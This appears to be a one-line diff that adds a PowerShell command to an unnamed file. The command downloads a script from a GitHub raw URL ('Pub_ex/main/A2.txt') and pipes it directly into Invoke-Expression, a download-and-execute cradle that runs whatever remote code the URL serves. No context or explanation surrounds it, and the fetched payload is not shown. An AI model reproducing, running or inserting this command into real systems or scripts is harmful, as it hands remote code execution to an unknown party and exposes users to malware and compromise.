@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/krizza72/Pub_ex/main/A2.txt') | IEX
